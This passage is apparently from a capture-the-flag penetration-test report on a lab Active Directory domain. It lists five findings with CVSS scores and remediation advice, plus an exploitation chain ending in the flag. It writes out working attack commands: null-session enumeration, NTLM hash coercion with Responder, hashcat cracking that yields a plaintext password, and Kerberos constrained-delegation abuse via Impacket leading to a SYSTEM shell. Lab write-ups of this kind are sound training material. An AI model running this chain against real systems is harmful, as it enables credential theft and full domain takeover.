  root@ip-10-48-108-181:~# smbexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local
  Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

  [!] Launching semi-interactive shell - Careful what you execute
  C:\Windows\system32>
  ```

- Read the flag from the Administrator's desktop: `type C:\Users\Administrator\Desktop\flag.txt`. Flag obtained: `THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}`.
  ```
  C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt
  THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}
  C:\Windows\system32>
  ```

## 4. Findings

_(One entry per vulnerability/technique. Filled in as discovered.)_

Severity methodology: CVSS v3.1 base score, computed with the official FIRST.org calculator. Bands: 9.0-10.0 Critical, 7.0-8.9 High, 4.0-6.9 Medium, 0.1-3.9 Low.

### F1 — Anonymous Null-Session Enumeration (SMB & LDAP)
- **Affected asset:** DC01.ctf.local (10.48.158.45) — SMB (445), LDAP (389)
- **Severity:** Medium (CVSS 3.1: 5.3) — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
- **Description:** The domain controller permits unauthenticated (null-session) SMB connections to list shares, and unauthenticated LDAP rootDSE queries, without requiring any credentials.
- **Evidence:**
  ```
  smbclient -L //10.48.158.45 -N
  ldapsearch -x -H ldap://10.48.158.45 -s base
  ```
- **Impact:** Discloses share names, domain naming context, DC hostname, and forest/domain functionality level to any unauthenticated network client, enabling further targeted attacks.
- **How found:** Anonymous `smbclient -L` share listing and anonymous `ldapsearch` rootDSE query.
- **Recommendation:** Disable anonymous/null-session SMB enumeration (`RestrictAnonymous`) and restrict anonymous LDAP binds.

### F2 — Sensitive Information Disclosure via Anonymous-Readable SMB Share
- **Affected asset:** `IT-Shared` SMB share on DC01.ctf.local
- **Severity:** Medium (CVSS 3.1: 5.3) — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
- **Description:** The `IT-Shared` share is readable with a null SMB session (no credentials required) and contains internal IT documentation, including a credentials backup file and an onboarding document describing automated service accounts (`svc.scanner`, `svc.mssql`) and their behavior.
- **Evidence:**
  ```
  smbclient //10.48.158.45/IT-Shared -N
  get IT-Credentials-Backup.txt / IT-Onboarding-Checklist.txt / IT-Portal.html
  ```
- **Impact:** While the disclosed credential pairs were marked disabled, the onboarding document revealed operationally sensitive detail — that `svc.scanner` runs an automated file-scanner over `IT-Shared` every 2 minutes and inspects file metadata/icons — which directly enabled the coerced-authentication attack in F3.
- **How found:** Anonymous read access to the share, manual review of downloaded files.
- **Recommendation:** Remove anonymous read access from internal file shares; restrict to authenticated, need-to-know users and audit share contents for stale sensitive documentation.

### F3 — Anonymous-Writable SMB Share Enables NTLM Authentication Coercion
- **Affected asset:** `IT-Shared` SMB share / `svc.scanner` service account
- **Severity:** High (CVSS 3.1: 7.5) — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Description:** The `IT-Shared` share is writable by an unauthenticated/guest session. The automated file-scanner service (`svc.scanner`) processes new files dropped into the share and inspects their metadata/icons, which can be abused by planting a file containing a UNC path to an attacker-controlled host. When the scanner inspects the file, it triggers an outbound SMB/NTLM authentication attempt to the attacker, allowing capture of the service account's NetNTLMv2 hash.
- **Evidence:**
  ```
  smbclient //10.48.158.45/IT-Shared  (anonymous, blank password)
  put @Shortcut.bat
  sudo responder -I ens5
  [SMB] NTLMv2-SSP Username : CTF\svc.scanner
  [SMB] NTLMv2-SSP Hash     : svc.scanner::CTF:63f5ff220541f4e7:...
  ```
- **Impact:** Remote, unauthenticated capture of a domain service account's authentication material without any direct interaction from a legitimate user — a classic coerced-authentication primitive, feeding directly into credential cracking (F4).
- **How found:** Reviewing onboarding documentation (F2) for automated-service behavior, then planting a UNC-path callback file in the writable share while running Responder.
- **Recommendation:** Remove anonymous write access to shares; disable NTLM where possible or enforce SMB signing/channel binding; apply least privilege to automated service accounts; monitor for anomalous outbound SMB authentication from service accounts.

### F4 — Weak/Crackable Service Account Password (`svc.scanner`)
- **Affected asset:** `svc.scanner` domain account
- **Severity:** High (CVSS 3.1: 8.1) — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`
- **Description:** The NetNTLMv2 hash captured for `svc.scanner` in F3 was cracked offline in under a minute using `hashcat` against the `rockyou.txt` wordlist, recovering the plaintext password `1summerlove!`. This credential was confirmed valid for domain authentication (SMB/LDAP).
- **Evidence:**
  ```
  hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
  ...:1summerlove!
  nxc smb 10.48.158.45 -d ctf.loc -u 'svc.scanner' -p '1summerlove!'
  [+] ctf.loc\svc.scanner:1summerlove!
  ```
- **Impact:** Grants full authenticated domain access as `svc.scanner`, including read/write on `IT-Shared`, domain user/password-policy enumeration, and — critically — the ability to exercise the account's Kerberos delegation rights (F5).
- **How found:** Offline dictionary attack against the captured hash from F3.
- **Recommendation:** Enforce strong, non-dictionary passwords for service accounts (ideally gMSA with randomized, rotated credentials); monitor for authentication attempts following hash-capture events.

### F5 — Kerberos Constrained Delegation with Protocol Transition Allows Domain Admin Impersonation
- **Affected asset:** `svc.scanner` domain account → DC01.ctf.local (`cifs/DC01`, `cifs/DC01.ctf.local` SPNs)
- **Severity:** Critical (CVSS 3.1: 9.9) — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
- **Description:** The `svc.scanner` account is configured for Kerberos Constrained Delegation with Protocol Transition (S4U2Self/S4U2Proxy) to the `cifs/DC01` and `cifs/DC01.ctf.local` service principal names. Any holder of this account's credentials can request a service ticket impersonating an arbitrary user — including `Administrator` — for the CIFS service on the domain controller itself, without that user's password or interactive logon.
- **Evidence:**
  ```
  findDelegation.py ctf.local/svc.scanner:'1summerlove!' -dc-ip 10.48.158.45
  svc.scanner  Person  Constrained w/ Protocol Transition  cifs/DC01.ctf.local  No
  getST.py -spn cifs/DC01.ctf.local -impersonate Administrator -dc-ip 10.48.158.45 ctf.local/svc.scanner:'1summerlove!'
  smbexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local
  C:\Windows\system32> (SYSTEM-level shell)
  ```
- **Impact:** Complete compromise of the domain controller and the Active Directory domain — full read/write filesystem access and command execution as Administrator/SYSTEM on `DC01`.
- **How found:** BloodHound graph analysis flagged an `AllowedToDelegate` edge from `svc.scanner` to `DC01.CTF.LOCAL`; confirmed directly against the DC with Impacket's `findDelegation.py`, then exploited with `getST.py` and `smbexec.py`.
- **Recommendation:** Remove unnecessary constrained-delegation-with-protocol-transition rights from service accounts, especially toward domain controllers; prefer resource-based constrained delegation scoped tightly to required services; audit `msDS-AllowedToDelegateTo` across the domain; monitor for S4U2Self/S4U2Proxy ticket requests.

## 5. Exploitation Chain

1. Anonymous SMB share enumeration (`smbclient -L -N`) revealed the non-default `IT-Shared` share (F1).
2. Connected to `IT-Shared` with a null/blank-password session and read `IT-Credentials-Backup.txt`, `IT-Onboarding-Checklist.txt`, and `IT-Portal.html` (F2) — the onboarding doc described the `svc.scanner` automated file-scanner service.
3. Uploaded a crafted `@Shortcut.bat` containing a UNC-path reference to the attack box into the writable `IT-Shared` share, while running `responder -I ens5` to catch the resulting authentication (F3).
4. The scanner service processed the planted file and authenticated outbound as `svc.scanner`, yielding a captured NetNTLMv2 hash.
5. Cracked the hash offline with `hashcat -m 5600` against `rockyou.txt`, recovering the plaintext password `1summerlove!`, and validated it via `nxc smb` (F4).
6. Enumerated the domain with `bloodhound-python` and identified an `AllowedToDelegate` edge from `svc.scanner` to `DC01.CTF.LOCAL`; confirmed with `findDelegation.py` (F5).
7. Abused the constrained delegation with `getST.py` (S4U2Self/S4U2Proxy) to obtain a service ticket impersonating `Administrator` for `cifs/DC01.ctf.local`.
8. Used the resulting ticket with `smbexec.py -k -no-pass` to obtain a SYSTEM-level shell on `DC01` and read the flag from the Administrator's desktop.

## 6. Flag & Proof

- **Flag:** `THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}`
- **Proof:** Read via Kerberos service-ticket shell (smbexec.py) as Administrator on DC01: `type C:\Users\Administrator\Desktop\flag.txt`

## 7. Remediation

_(Optional — fill in if the challenge expects defensive recommendations.)_

## 8. Appendix

_(Raw command output, scripts, screenshots referenced from findings.)_
